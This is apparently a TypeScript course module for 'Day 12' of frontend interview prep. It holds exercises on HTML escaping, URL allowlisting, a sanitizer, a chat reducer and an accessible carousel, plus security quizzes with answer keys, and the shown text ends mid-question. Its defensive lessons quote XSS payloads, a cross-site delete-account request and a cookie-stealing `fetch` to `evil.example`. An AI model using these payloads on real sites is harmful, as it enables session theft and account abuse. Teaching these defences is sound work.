import type { Day, Exercise } from '../../types';

import caseStudies from './lessons/case-studies.md?raw';
import webSecurity from './lessons/web-security.md?raw';
import architectureAtScale from './lessons/architecture-at-scale.md?raw';

import escapeStarter from './exercises/escape-html-safe-url/starter.ts?raw';
import escapeSolution from './exercises/escape-html-safe-url/solution.ts?raw';
import escapeTests from './exercises/escape-html-safe-url/tests.ts?raw';
import sanitizeStarter from './exercises/sanitize-html-allowlist/starter.tsx?raw';
import sanitizeSolution from './exercises/sanitize-html-allowlist/solution.tsx?raw';
import sanitizeTests from './exercises/sanitize-html-allowlist/tests.tsx?raw';
import chatStarter from './exercises/chat-message-reducer/starter.ts?raw';
import chatSolution from './exercises/chat-message-reducer/solution.ts?raw';
import chatTests from './exercises/chat-message-reducer/tests.ts?raw';
import carouselStarter from './exercises/accessible-image-carousel/starter.tsx?raw';
import carouselSolution from './exercises/accessible-image-carousel/solution.tsx?raw';
import carouselTests from './exercises/accessible-image-carousel/tests.tsx?raw';

const escapeHtmlSafeUrl: Exercise = {
  id: 'escape-html-safe-url',
  title: 'escapeHtml() and isSafeUrl()',
  runtime: 'logic',
  difficulty: 'core',
  estMinutes: 15,
  tags: ['security', 'xss', 'strings', 'regex'],
  prompt: `Two small functions that every frontend security discussion eventually reaches.

**1. \`escapeHtml(input)\`** makes a string safe to insert into HTML text or a *quoted* attribute value by replacing \`&\` \`<\` \`>\` \`"\` \`'\` with \`&amp;\` \`&lt;\` \`&gt;\` \`&quot;\` \`&#39;\`.

\`\`\`ts
escapeHtml(\`<img src=x onerror="alert('xss')">\`);
// '&lt;img src=x onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;'
\`\`\`

**2. \`isSafeUrl(url)\`** decides whether a user-supplied URL may go into an \`href\` or \`src\`.

- ✅ \`http:\`, \`https:\` and \`mailto:\` in any letter case, plus **relative** URLs (\`/a\`, \`./a\`, \`../a\`, \`?q=1\`, \`#top\`, \`docs/page.html\`, \`//cdn.example.com/x\`).
- ❌ Everything else, because this is an **allowlist**: \`javascript:\`, \`data:\`, \`vbscript:\`, \`ftp:\`, \`blob:\`…
- ❌ Disguises that browsers still execute: mixed case (\`JaVaScRiPt:\`), leading spaces or control characters (\`"\\u0001javascript:…"\`), and tabs or newlines **inside** the scheme (\`"java\\tscript:…"\`). The WHATWG URL parser strips leading/trailing C0 controls and spaces and removes tab/LF/CR everywhere, so these still run.
- The input is the final attribute value: HTML entities are already decoded.

**What the interviewer is looking for:** escaping \`&\` without double-escaping, an allowlist rather than a blocklist, and knowing *why* \`"java\\tscript:"\` is dangerous (the browser's URL parser normalises it away). Bonus: escaping protects the HTML *syntax*, not the URL's *meaning*. A \`javascript:\` URL is perfectly escaped HTML.`,
  starter: escapeStarter,
  solution: escapeSolution,
  tests: escapeTests,
  hints: [
    'escapeHtml: a single `replace` with a character class (`/[&<>"\']/g`) and a lookup object handles all five characters in one pass, so nothing gets escaped twice.',
    'isSafeUrl: normalise first, the way the browser does: strip leading/trailing `[\\u0000-\\u0020]` and delete `[\\t\\n\\r]` everywhere.',
    'Then extract a scheme with `/^([a-z][a-z0-9+.-]*):/i`. No match means a relative URL, which is safe. Otherwise lower-case the scheme and check it against a `Set` of allowed schemes.',
  ],
  explanation: `**escapeHtml:** \`input.replace(/[&<>"']/g, (ch) => map[ch])\` is O(n) and escapes each character exactly once. Chained \`.replace\` calls only work if \`&\` goes **first**. Replace \`<\` first and the \`&\` of the new \`&lt;\` gets escaped again (\`&amp;lt;\`). Escaping is deliberately **not idempotent**: escape exactly once, at output time, for the right context. In React you rarely call this yourself (JSX text is escaped for you). You need it when you build HTML strings: emails, \`iframe srcdoc\`, hand-rolled SSR templates, \`innerHTML\` in non-React code.

**Context matters.** HTML escaping is correct for text and *quoted* attributes. It is wrong inside \`<script>\` (use JSON with \`<\` escaped), in URLs (\`encodeURIComponent\` for components plus a scheme check), in CSS, and in unquoted attributes (always quote them).

**isSafeUrl:** the normalisation mirrors the WHATWG URL parser. React 19's own check uses the same idea (\`/^[\\u0000-\\u001F ]*j[\\r\\n\\t]*a…/i\`). Another option is to let the platform do the parsing:

\`\`\`ts
function isSafeUrl(url: string): boolean {
  try {
    const { protocol } = new URL(url, 'https://base.invalid'); // relative URLs resolve to https:
    return ['http:', 'https:', 'mailto:'].includes(protocol);
  } catch {
    return false; // unparsable, e.g. 'http://' with no host
  }
}
\`\`\`

That version is arguably more robust (it *is* the browser's parser), but it allocates, and the try/catch hides intent. Both are fine to discuss.

**Follow-ups:**
- *"Why not just block \`javascript:\`?"* A blocklist misses \`data:\` (an HTML document in an iframe), \`vbscript:\` (legacy IE) and whatever comes next. Allowlist the few schemes you need.
- *"Is \`//evil.com\` safe?"* It can't execute script (it inherits http/https), but it's an **open redirect** if used as a post-login \`next\` URL. Validate redirect targets against your own origin: \`new URL(next, location.origin).origin === location.origin\`.
- *"Where does this run?"* At the sink: inside a \`<SafeLink>\` component or a markdown renderer's link hook. Also on the server before storing profile URLs (defence in depth).
- *"What about \`tel:\` or \`sms:\`?"* Add them if the product needs them. That's what an allowlist is for.`,
};

const sanitizeHtmlAllowlist: Exercise = {
  id: 'sanitize-html-allowlist',
  title: 'sanitizeHtml(): an allowlist sanitizer with DOMParser',
  runtime: 'dom',
  difficulty: 'stretch',
  estMinutes: 20,
  tags: ['security', 'xss', 'dom', 'sanitization'],
  prompt: `Build a small **allowlist** HTML sanitizer using the browser's own parser. This is the core idea behind DOMPurify.

\`\`\`ts
sanitizeHtml(
  '<p onclick="steal()">Hi <a href="javascript:alert(1)" title="x">there</a><script>alert(1)</script></p>',
  { allowedTags: ['p', 'a'], allowedAttributes: { a: ['href', 'title'] } },
);
// → '<p>Hi <a title="x">there</a></p>'
\`\`\`

Rules (also in the starter's doc comment):

1. Parse into an **inert** document with \`new DOMParser().parseFromString(html, 'text/html')\` (or a \`<template>\`). Never set \`innerHTML\` on an element of the live document: in real browsers \`<img src=x onerror=…>\` fires even on a detached element.
2. Elements in \`DROP_WITH_CONTENT\` (\`script\`, \`style\`, \`iframe\`, \`svg\`, …) are **removed together with everything inside**, even if they're allow-listed.
3. Any other element not in \`allowedTags\` is **unwrapped**: the element goes, its (sanitized) children stay. \`<div><b>x</b></div>\` with only \`b\` allowed becomes \`<b>x</b>\`.
4. On allowed elements, keep only attributes allowed for that tag or for \`'*'\`. **Always** remove \`on*\` attributes, even if the config allows them. Remove any \`URL_ATTRIBUTES\` (\`href\`, \`src\`, …) whose value fails \`isSafeUrl\` (provided).
5. Remove comments.
6. Return the sanitized HTML as a **string**.

**What the interviewer is looking for:** a real HTML parser instead of regexes; a safe tree walk (iterate over a *copy* of \`childNodes\` and \`attributes\` while you mutate them); the unwrap-vs-drop distinction; and the insight that URL checks must run on the **decoded** attribute value (\`&#106;avascript:\` *is* \`javascript:\`).`,
  starter: sanitizeStarter,
  solution: sanitizeSolution,
  tests: sanitizeTests,
  hints: [
    'Use `const doc = new DOMParser().parseFromString(html, "text/html")`, walk `doc.body` recursively, and finally return `doc.body.innerHTML`.',
    'Iterate over `Array.from(parent.childNodes)` and `Array.from(el.attributes)`: both live collections change as you remove things. Use `el.localName` (lower case) for tag names.',
    'For each element: drop it if it is in DROP_WITH_CONTENT. Otherwise recurse into its children FIRST, then either clean its attributes (allowed) or unwrap it with `el.replaceWith(...Array.from(el.childNodes))`. Remove nodes that are neither elements nor text (comments).',
  ],
  explanation: `**Approach:** parse → walk → serialise. The browser's parser does the hard part: it decodes entities, repairs malformed markup (\`<li>one<li>two\`), lower-cases names and builds the same tree the browser would render. Walking children *before* deciding to unwrap means any grandchildren you hoist are already clean. Complexity: O(nodes + attributes).

**Why each rule exists:**
- **Drop vs unwrap.** Unwrapping keeps the content of harmless containers (\`div\`, \`span\`, \`font\`). But the content of \`script\`/\`style\` is code, not prose, and \`svg\`/\`math\` bring foreign-content parsing rules that are behind many *mutation XSS* (mXSS) bypasses.
- **\`on*\` always removed.** Configuration mistakes happen; event handlers are never data.
- **URL check after parsing.** \`jav&#x09;ascript:\` becomes \`jav<TAB>ascript:\` in the DOM, and then the URL parser strips the tab. A check on the raw string misses it.
- **Inert parsing.** DOMParser documents have scripting disabled and don't load resources, so nothing executes while you inspect the tree.

**What DOMPurify does beyond this** (good follow-up material): it defends against namespace confusion and mXSS by checking that the serialised output re-parses to the same tree; sanitizes \`srcset\`, \`style\` and \`target\`; offers hooks and profiles; can return \`TrustedHTML\` for Trusted Types; and it has been fuzzed and attacked for years. **In production, use DOMPurify** (or the HTML Sanitizer API, \`el.setHTML()\`, where it's supported). A hand-written sanitizer is an interview exercise, not a product decision.

**Follow-ups:**
- *"Where would you call it in React?"* In a \`useMemo\` right before \`dangerouslySetInnerHTML\`, ideally inside one reviewed \`<SafeHtml>\` component, so that's the only place the escape hatch appears (lint against it everywhere else).
- *"Server or client?"* Both are valid. The client sanitizes with the parser that will render the HTML; the server sanitizes before storing it for other consumers (emails, mobile apps).
- *"Is unwrapping always right?"* For rich text, yes. For a plain comment box you might escape the disallowed markup instead, so users see exactly what they typed.`,
};

const chatMessageReducer: Exercise = {
  id: 'chat-message-reducer',
  title: 'Chat message store: optimistic sends, acks, ordering and dedupe',
  runtime: 'logic',
  difficulty: 'core',
  estMinutes: 20,
  tags: ['system design', 'reducers', 'real-time', 'idempotency', 'immutability'],
  prompt: `Implement the reducer behind a chat conversation view: the "D" of the chat system design, made concrete. Messages are sent **optimistically** and confirmed by the server **asynchronously**, and server events can arrive **out of order** and **more than once** (at-least-once delivery after reconnects).

\`\`\`ts
let s = initialChatState;
s = chatReducer(s, { type: 'send', clientId: 'c1', authorId: 'me', body: 'hi', createdAt: Date.now() });
// [hi: pending]
s = chatReducer(s, { type: 'receive', message: { serverId: 's3', seq: 3, authorId: 'bob', body: 'yo', createdAt: 0 } });
// [yo: sent (seq 3), hi: pending]     ← unconfirmed messages stay at the bottom
s = chatReducer(s, { type: 'ack', clientId: 'c1', serverId: 's2', seq: 2 });
// [hi: sent (seq 2), yo: sent (seq 3)] ← the ack moves it into seq order
\`\`\`

| Action | Behaviour |
|---|---|
| \`send\` | Append a \`pending\` message. Ignore a \`clientId\` you already have (double click). |
| \`ack\` | Attach \`serverId\` + \`seq\`, set \`sent\`, re-order. Ignore unknown or already-confirmed messages. |
| \`receive\` | Ignore a known \`serverId\` (duplicate). If \`message.clientId\` matches a local message, **reconcile** it (the echo can beat the ack). Otherwise insert as \`sent\`, ordered by \`seq\`. |
| \`fail\` | \`pending\` → \`failed\`. Ignore anything else: a late timeout must never downgrade a \`sent\` message. |
| \`retry\` | \`failed\` → \`pending\`, keeping the **same \`clientId\`** so the server can de-duplicate. |

Invariant: confirmed messages sorted by \`seq\`, then unconfirmed ones in send order. **Never mutate** state, and return the **same object** for ignored actions (so React can bail out of re-rendering).

**What the interviewer is looking for:** ordering by server sequence rather than client clocks, idempotency in both directions (client \`clientId\`, server \`serverId\`), handling races (echo before ack, timeout after ack), and immutable updates.`,
  starter: chatStarter,
  solution: chatSolution,
  tests: chatTests,
  hints: [
    'Write small helpers first: `findByClientId`, `hasServerId`, and `ordered(messages)` returning `[...confirmedSortedBySeq, ...unconfirmed]`. After that, each action is a few lines.',
    'Check the "ignore" conditions first and `return state` unchanged. For changes, `map` to a new array with a spread copy of the one message you change. Never `push`, `sort` or assign on the existing arrays.',
    '`receive` with a `clientId` you already know is just an ack in disguise: call the same "confirm" helper as `ack` (attach serverId + seq, set status sent, re-order).',
  ],
  explanation: `**Approach:** guard clauses for idempotency, then immutable updates, then restore the ordering invariant. Re-sorting with \`filter\` + \`sort\` is O(n log n) per event, which is fine for the loaded window of a conversation. At scale you'd binary-search the insertion point (O(log n) search + O(n) copy) or keep ids in a structure keyed by \`seq\`.

**Why these rules matter:**
- **Server \`seq\`, not \`createdAt\`.** Client clocks skew, and two senders' clocks disagree. The server's per-conversation sequence is the single source of order. A gap (you have 103 and receive 105) should trigger a fetch of the missing range.
- **Dedupe in both directions.** The client dedupes server events by \`serverId\` (at-least-once delivery); the server dedupes client sends by \`clientId\` (idempotency key). Together they give effectively-once behaviour.
- **Races.** The echo can arrive before the ack, and a timeout can fire after success. Treat the server's word as final: \`fail\` only applies to \`pending\`, and a late \`ack\` can still confirm a \`failed\` message.
- **Same reference when ignored.** \`useReducer\` skips re-rendering when the reducer returns the same state (\`Object.is\`), so duplicates cost nothing.

**Production shape:** normalise the state (a \`byClientId\` map, an ordered id list and a \`serverId → clientId\` index) for O(1) lookups; keep \`clientId\` as the React \`key\` so a row doesn't remount when its ack arrives; persist pending messages in an IndexedDB outbox.

**Follow-ups:**
- *"Add delivered/read receipts."* Store a per-user \`lastReadSeq\` watermark on the conversation and derive "read" for every message with \`seq <= watermark\`, instead of per-message flags.
- *"Add edits and deletes."* They're events with their own ids and versions. Apply one only if its version is newer (last-writer-wins per message).
- *"How would you test it?"* Exactly like these tests: feed action sequences (including duplicates and reorderings) and assert on the resulting list. Property-based tests, where random permutations of the same events must converge to the same state, make a great senior answer.`,
};

const accessibleImageCarousel: Exercise = {
  id: 'accessible-image-carousel',
  title: 'Machine coding: accessible ImageCarousel',
  runtime: 'dom',
  difficulty: 'core',
  estMinutes: 25,
  preview: true,
  tags: ['react', 'accessibility', 'machine coding', 'timers', 'components'],
  prompt: `A classic machine-coding round. Build \`ImageCarousel\` following the WAI-ARIA APG carousel pattern. The tests query by **role and accessible name**, which is how a screen reader user experiences the component.

\`\`\`tsx
<ImageCarousel label="Product photos" slides={[{ src, alt, caption }]} autoplayMs={5000} initialIndex={0} />
\`\`\`

**Core requirements**
- Root: \`<section aria-roledescription="carousel" aria-label={label}>\`, a labelled region.
- Each slide: \`role="group"\`, \`aria-roledescription="slide"\`, \`aria-label="2 of 5"\`. Only the current slide is exposed; give the others the \`hidden\` attribute.
- Buttons with accessible names **"Previous slide"** and **"Next slide"** that wrap around at both ends.
- One button per slide named **"Go to slide n"**; the current one has \`aria-current="true"\`.
- **ArrowLeft / ArrowRight** while focus is anywhere inside the carousel → previous / next.
- The element that wraps the slides has \`aria-live="polite"\`.
- \`initialIndex\` chooses the first slide.

**Stretch: autoplay** (when \`autoplayMs\` is set)
- Advance every \`autoplayMs\` and wrap around.
- **Pause** while the mouse is over the carousel or while focus is inside it, and resume when both end.
- A rotation control named **"Stop automatic slide show"** / **"Start automatic slide show"**, first in tab order.
- \`aria-live="off"\` while actually rotating and \`"polite"\` otherwise, so manual changes are announced and automatic ones aren't.

The preview renders a four-slide demo with autoplay. Try it with the keyboard.

**What the interviewer is looking for:** a clean state model (one \`index\`, derived values instead of duplicated state), wrap-around modular arithmetic, timer cleanup in \`useEffect\`, correct focus-within handling (\`relatedTarget\`), and accessibility designed in from the start rather than bolted on.`,
  starter: carouselStarter,
  solution: carouselSolution,
  tests: carouselTests,
  hints: [
    'State: `index`, `playing` (the user\'s choice), `hovered`, `focusWithin`. Derive `rotating = autoplayMs !== undefined && playing && !hovered && !focusWithin` instead of storing it.',
    'Wrap-around: `const wrap = (i, n) => ((i % n) + n) % n`, because `-1 % 3` is `-1` in JavaScript. Put `onKeyDown`, `onMouseEnter`/`onMouseLeave` and `onFocus`/`onBlur` on the `<section>`: React focus events bubble.',
    'Autoplay: `useEffect(() => { if (!rotating) return; const id = setInterval(() => setIndex((i) => wrap(i + 1, n)), autoplayMs); return () => clearInterval(id); }, [rotating, autoplayMs, n])`. In `onBlur`, clear `focusWithin` only if `!e.currentTarget.contains(e.relatedTarget as Node)`.',
  ],
  explanation: `**State model:** one source of truth (\`index\`) plus the *reasons* rotation may be paused (\`playing\`, \`hovered\`, \`focusWithin\`). \`rotating\` is **derived**, so pause/resume logic can't drift out of sync, and because the effect depends on \`rotating\`, the interval starts and stops automatically (with cleanup on pause, unmount and prop changes). The functional update \`setIndex((i) => …)\` avoids a stale closure over \`index\` inside the interval.

**Accessibility details worth saying out loud:**
- \`aria-roledescription\` changes how the region and the groups are announced ("carousel", "slide"), and the \`"3 of 5"\` labels convey position. The region needs an accessible name.
- Inactive slides use \`hidden\`, so neither assistive tech nor the Tab key reaches invisible content. \`inert\` is an alternative if you need to keep them rendered for animation.
- **Live-region strategy:** \`polite\` for user-initiated changes, \`off\` while auto-rotating, so a screen reader isn't interrupted every few seconds.
- **WCAG 2.2.2 Pause, Stop, Hide:** auto-moving content that lasts longer than 5 s needs a pause control. APG goes further: once keyboard focus has entered the carousel, rotation shouldn't resume until the user presses Start. This solution resumes on blur, a simplification worth naming.
- Arrow keys on the region are a convenience. The APG *tabbed* carousel instead turns the dots into a \`tablist\` with a roving \`tabindex\` and arrow-key navigation between tabs.
- Respect \`prefers-reduced-motion\`: no slide animation, and no autoplay by default.

**Performance:** the current slide and its neighbours use \`loading="eager"\` (preloaded even while hidden); the rest use \`lazy\`, and lazy images inside \`display: none\` slides aren't fetched until shown. Give images intrinsic dimensions or an \`aspect-ratio\` box to avoid CLS, and animate with \`transform\`.

**Follow-ups:**
- *"Make it controlled."* Accept \`index\` + \`onIndexChange\`, falling back to internal state when \`index\` is undefined.
- *"Add swipe."* Use Pointer Events with \`setPointerCapture\`, a distance or velocity threshold, and \`touch-action: pan-y\`. Or rebuild on CSS scroll snap and sync \`index\` from \`scrollend\`.
- *"Restart the timer after manual navigation?"* Add \`index\` to the effect's dependencies, so every change restarts the countdown.
- *"How would you test it?"* Exactly like these tests: Testing Library queries by role and name, \`userEvent\` for interactions, and fake timers advanced inside \`act\` for autoplay.`,
};

const day: Day = {
  number: 12,
  title: 'Frontend System Design II: Case Studies & Web Security',
  tagline: 'Chat, carousel, checkout, collaborative editing and design systems in RADIO, plus the security and scale questions that close every senior loop.',
  summary:
    'Day 11 gave you the RADIO framework and the building blocks. Today you apply them to the five most common frontend design prompts and practise making, and defending, the key decisions in each. Then you get precise about web security: what React does and doesn\'t protect, CSP, CSRF, CORS, clickjacking, token storage, OAuth + PKCE and the supply chain. This is where vague answers sink senior candidates. You finish with architecture at scale (monorepos, micro-frontends, i18n, observability, feature flags) and implement URL validation, an HTML sanitizer, a chat message store and an accessible carousel.',
  objectives: [
    'Outline chat, carousel, e-commerce, collaborative-editor and design-system designs in RADIO with explicit trade-offs',
    'Explain WebSocket heartbeats and reconnection, message ordering by server sequence, and idempotency with client-generated ids',
    'Explain the three XSS types and exactly what React 19 does and does not protect',
    'Design a strict, nonce-based CSP rollout and explain Trusted Types',
    'Distinguish XSS, CSRF, CORS and clickjacking and name the right defence for each',
    'Recommend token storage and an Authorization Code + PKCE (or BFF) setup for SPAs',
    'Discuss micro-frontends, i18n, observability and feature flags as trade-offs, not buzzwords',
    'Implement escapeHtml/isSafeUrl, an allowlist sanitizer, a chat reducer and an accessible carousel',
  ],
  skills: ['system-design', 'security', 'accessibility', 'networking', 'react', 'interviewing'],
  blocks: [
    {
      kind: 'review',
      id: 'review-warmup',
      title: 'Warm-up: spaced repetition',
      minutes: 15,
      intro:
        'Cards from earlier days. Today leans on Day 8 (cookies and storage), Day 9 (ARIA and live regions), Day 10 (HTTP caching) and Day 11 (RADIO and real-time transports), so pay extra attention to those.',
    },
    {
      kind: 'lesson',
      id: 'case-studies',
      title: 'System design case studies: chat, carousel, checkout, collaborative editor, design system',
      minutes: 40,
      body: caseStudies,
      checks: [
        {
          id: 'chat-backoff-jitter',
          prompt:
            'A deploy restarts your chat servers and 200,000 clients disconnect at the same moment. Why should the reconnect delay include **random jitter**, not just exponential backoff?',
          choices: [
            'Jitter makes each individual reconnect faster on average',
            'Without jitter, clients that disconnected together retry together, so synchronized waves (a thundering herd) can knock the recovering servers over again',
            'Browsers reject WebSocket connections attempted at exact power-of-two intervals',
            'Jitter is only needed for SSE; the WebSocket API reconnects automatically',
          ],
          answer: 1,
          explanation:
            'Exponential backoff spreads retries over time *for one client*, but every client that failed at the same instant computes the **same schedule**, so they all hit the server at 0.5 s, 1 s, 2 s… in lockstep. Randomising the delay ("full jitter": a random value between 0 and the capped exponential ceiling) de-synchronises them. Jitter isn\'t about making one client faster. Browsers don\'t care about retry intervals. And it\'s the other way round: `EventSource` (SSE) reconnects automatically (the server can tune it with `retry:`), while the **WebSocket API never reconnects on its own**. You write that logic, including the heartbeat that detects half-open connections.',
        },
        {
          id: 'cart-cross-tab-sync',
          prompt: 'Tab A updates the cart and calls `localStorage.setItem("cartVersion", "8")`. Which tabs receive a `storage` event?',
          choices: [
            'Only tab A',
            'Every same-origin tab, including tab A',
            'Every *other* same-origin tab or window, but not tab A, which made the change',
            'None: the storage event only fires for sessionStorage',
          ],
          answer: 2,
          explanation:
            'The `storage` event fires in **other** documents of the same origin that share the storage area, never in the document that made the change. That makes it a cheap cross-tab notification ("cart changed, refetch"). `BroadcastChannel` behaves similarly: the sending channel object doesn\'t receive its own message. Tab A updates its own UI directly. `sessionStorage` is scoped to a single tab, so it can\'t be used for cross-tab sync at all.',
        },
        {
          id: 'crdt-merge-property',
          prompt: 'Which property lets CRDT replicas edit offline and still converge, without a central server ordering the operations?',
          choices: [
            'Every operation carries the client clock time and the latest timestamp wins',
            'The merge is commutative, associative and idempotent, so replicas reach the same state whatever the order or duplication of updates',
            'The server transforms each operation against concurrent ones before applying it',
            'Paragraphs are locked so two users can never edit the same text concurrently',
          ],
          answer: 1,
          explanation:
            'That\'s the defining CRDT property: apply the same set of updates in any order, any number of times, and you get the same state. That\'s why offline and peer-to-peer work. Option A describes last-writer-wins. It is a valid CRDT for a single register, but it relies on clocks, silently drops concurrent edits, and isn\'t how sequence CRDTs merge text. Option C is **Operational Transformation**, which typically needs a central server. Option D is pessimistic locking: it avoids conflicts by forbidding concurrency, which makes for poor collaborative UX.',
        },
      ],
    },
    {
      kind: 'lesson',
      id: 'web-security',
      title: 'Web security for frontend engineers',
      minutes: 45,
      body: webSecurity,
      checks: [
        {
          id: 'react-xss-sink',
          prompt: 'In a React 19 app, `bio` and `site` come from other users. Which line is an XSS vulnerability?',
          choices: [
            '`<p>{bio}</p>`',
            '`<img alt={bio} src="/avatar.png" />`',
            '`<div dangerouslySetInnerHTML={{ __html: marked.parse(bio) }} />`',
            '`<a href={site}>Website</a>` with `site = "javascript:alert(1)"`',
          ],
          answer: 2,
          explanation:
            'Markdown renderers pass raw HTML through by default, so `marked.parse(bio)` can emit `<img src=x onerror=…>`, and `dangerouslySetInnerHTML` inserts it unsanitized: stored XSS. Fix it with `DOMPurify.sanitize(...)` before rendering, or render markdown to React elements without raw HTML. Options A and B are escaped by React (text and attribute values). Option D is neutralised by React 19, which replaces `javascript:` URLs with one that throws, but in React ≤ 18 it runs on click, and React still doesn\'t block `data:` URLs or open redirects. In an interview, mention both halves.',
        },
        {
          id: 'samesite-same-site-subdomain',
          prompt:
            'Your session cookie for `app.example.com` is `SameSite=Strict`. An attacker finds XSS on `blog.example.com` (another team\'s CMS). Can script there send a POST to `https://app.example.com/api/transfer` that carries the session cookie?',
          choices: [
            'No: Strict cookies are never sent on requests initiated from another origin',
            'Yes: blog.example.com and app.example.com are the same *site*, so SameSite doesn\'t block it. You still need CSRF tokens or Origin checks',
            'No: browsers block all cross-origin POST requests',
            'Yes, but only if the cookie was set with `Domain=example.com`',
          ],
          answer: 1,
          explanation:
            'SameSite is about **sites** (scheme + registrable domain), not origins. Both hosts share `example.com`, so the request is same-site and even a `Strict` cookie is attached. A simple form-style POST is sent and processed. That\'s why subdomain takeovers and XSS on a sibling app matter, and why CSRF tokens or `Origin`/`Sec-Fetch-Site` checks remain useful. Browsers don\'t block cross-origin POSTs (CORS only hides responses). The `Domain` attribute controls which hosts *receive* the cookie. Here the request goes to app.example.com, which receives it either way.',
        },
        {
          id: 'cors-simple-post-reaches-server',
          prompt:
            'A script on `https://evil.example` runs `fetch("https://api.example/delete-account", { method: "POST", credentials: "include", body: "confirm=yes" })`. The API sends no CORS headers. What happens?',
          choices: [
            'The browser blocks the request before sending it, because the API has no CORS headers',
            'The browser sends a preflight OPTIONS request, which fails, so the POST is never sent',
            'The request is sent and processed (with cookies, if their SameSite setting allows); the browser only stops the script from reading the response',
            'The request is sent, but CORS always strips cookies from cross-origin requests',
          ],
          answer: 2,
          explanation:
            'A string body defaults to `Content-Type: text/plain`, so this is a **simple request**: no preflight. The browser sends it, the server acts on it, and only then does the browser hide the response from the script. **CORS is not a CSRF defence.** What stops this attack: `SameSite=Lax`/`Strict` session cookies (then no cookie is attached cross-site), CSRF tokens, `Origin`/Fetch Metadata checks, and requiring `application/json` or a custom header, which forces a preflight the attacker\'s origin fails. CORS never strips cookies; whether they\'re attached is decided by `credentials` and SameSite.',
        },
      ],
    },
    {
      kind: 'lesson',
      id: 'architecture-at-scale',
      title: 'Architecture at scale: repos, micro-frontends, i18n, observability, flags',
      minutes: 30,
      body: architectureAtScale,
      checks: [
        {
          id: 'icu-plural-categories',
          prompt: 'Why is `count === 1 ? "plik" : "pliki"` wrong for Polish ("file")?',
          choices: [
            'It isn\'t: every language has exactly one singular and one plural form',
            'Polish has separate one / few / many forms (1 plik, 2 pliki, 5 plików, 22 pliki), so the form must come from CLDR plural rules via ICU `plural` or `Intl.PluralRules`',
            'Polish puts the number after the noun, so only the word order is wrong',
            'Polish uses a different digit system, so `count` must be formatted first',
          ],
          answer: 1,
          explanation:
            'CLDR defines up to six plural categories (`zero, one, two, few, many, other`). English uses two, Polish four (1 → one, 2–4 and 22–24 → few, 5–21 → many, fractions → other) and Arabic all six. Hard-coding `=== 1` bakes English grammar into your code. Put the whole sentence in one ICU message (`{count, plural, one {# plik} few {# pliki} many {# plików} other {# pliku}}`) and let translators fill in each category. Word order is a separate reason to avoid concatenation, and Polish uses Western Arabic digits.',
        },
        {
          id: 'logical-properties-rtl',
          prompt: 'A card has `margin-inline-start: 16px`. What happens when the document switches to `dir="rtl"`?',
          choices: [
            'The margin stays on the left',
            'The margin moves to the right, because inline-start follows the writing direction',
            'The margin moves to the top',
            'Nothing: logical properties only work inside flex containers',
          ],
          answer: 1,
          explanation:
            'Logical properties are defined relative to the writing mode and direction. In RTL the inline start is the **right** edge, so the margin flips automatically, with no `[dir=rtl]` overrides. Physical properties (`margin-left`) never flip, which is why RTL support starts with migrating to `margin-inline-*`, `padding-block-*`, `inset-inline-*` and `text-align: start`. Logical properties work on any element, not just in flex layouts.',
        },
        {
          id: 'flag-bucketing-stable',
          prompt: 'Why bucket feature-flag users with `hash(flagKey + ":" + userId) % 100 < percent` instead of `Math.random() < percent / 100` on each page load?',
          choices: [
            '`Math.random` is too slow for production',
            'Hashing is deterministic: the same user gets the same variant on every load and device, raising the percentage keeps earlier users enabled, and the flag key keeps cohorts independent across flags',
            'Hashing guarantees exactly `percent`% of users, to the decimal',
            '`Math.random` cannot produce values below 0.1',
          ],
          answer: 1,
          explanation:
            'With `Math.random` a user flips between variants on every load, which is a confusing UX and invalidates any experiment. A stable hash gives **sticky, reproducible** assignment that the server and client agree on, a **monotonic** rollout (users in the 10% cohort stay in at 50%), and, by salting with the flag key, **independent** cohorts so the same 1% of users don\'t get every risky feature. Hashing gives approximately the target share, not an exact one. `Math.random` is fast and covers [0, 1).',
        },
      ],
    },
    {
      kind: 'quiz',
      id: 'security-scenarios',
      title: 'Security and design scenarios',
      minutes: 15,
      intro: 'Scenario questions like the ones interviewers use as follow-ups. Commit to an answer, then read the explanation: the wrong options are the answers interviewers hear most often.',
      questions: [
        {
          id: 'react19-javascript-url-scope',
          prompt: 'A React 19 app renders `<a href={profile.website}>Website</a>` for user-supplied websites. Which statement is accurate?',
          choices: [
            'React escapes attribute values, so any URL is safe in `href`',
            'React 19 neutralises `javascript:` URLs in `href`, but other schemes (e.g. `data:`) and non-React sinks such as `window.location = url` still need your own scheme allowlist',
            'React 19 blocks every non-http(s) URL in `href` and `src`',
            '`href` is only dangerous when combined with `target="_blank"`',
          ],
          answer: 1,
          explanation:
            'Escaping stops a value from breaking out of the attribute (quotes, `<`), but it doesn\'t change what the attribute *means*: `javascript:alert(1)` is perfectly escaped HTML. React 19\'s `sanitizeURL` special-cases `javascript:` (tolerating leading control characters, embedded tabs/newlines and mixed case) and swaps it for a URL that throws. It leaves `data:`, `vbscript:` and open-redirect targets alone, and it can\'t see imperative sinks like `location.href`, `window.open` or `router.push`. So option C is wrong. `target="_blank"` relates to reverse tabnabbing via `window.opener` (now mitigated because browsers imply `noopener`), not to script execution.',
        },
        {
          id: 'ssr-state-script-breakout',
          prompt: 'This hand-rolled SSR template embeds state for hydration. A user\'s `bio` is the string shown in the comment. What happens when another user loads the page?',
          code: `const html = \`
  <div id="root">\${appHtml}</div>
  <script>window.__STATE__ = \${JSON.stringify(state)}</script>\`;

// state.user.bio === '</script><script>fetch("//evil.example?c=" + document.cookie)</script>'`,
          codeLang: 'ts',
          choices: [
            'Nothing: `JSON.stringify` quotes and escapes the string, so it stays inside a JS string literal',
            'The HTML parser ends the script element at the first `</script>`, so the attacker\'s `<script>` becomes a real element and runs (unless a strict CSP blocks it)',
            'The page throws a JSON `SyntaxError` and nothing executes',
            'React escapes it during hydration, so the payload is harmless',
          ],
          answer: 1,
          explanation:
            'The HTML tokenizer runs **before** any JavaScript parsing and ends a script element at the first `</script`, no matter whether it sits inside a JS string. The first script becomes `window.__STATE__ = {"user":{"bio":"`, which is a JS syntax error, so it fails. Then the attacker\'s `<script>` element is parsed and executed. `JSON.stringify` escapes quotes and backslashes, not `<`. Hydration is irrelevant because the injected script runs during HTML parsing, before React loads. **Fix:** `JSON.stringify(state).replace(/</g, "\\\\u003c")` or a serializer (`serialize-javascript`, `devalue`), which frameworks do for you. A nonce-based CSP would block the injected script as defence in depth.',
        },
        {
          id: 'samesite-lax-which-request',
          prompt: 'The session cookie for `bank.example` is set with `SameSite=Lax`. Which request initiated from a page on `https://evil.example` will include it?',
          choices: [
            'An auto-submitted `<form method="POST" action="https://bank.example/transfer">`',
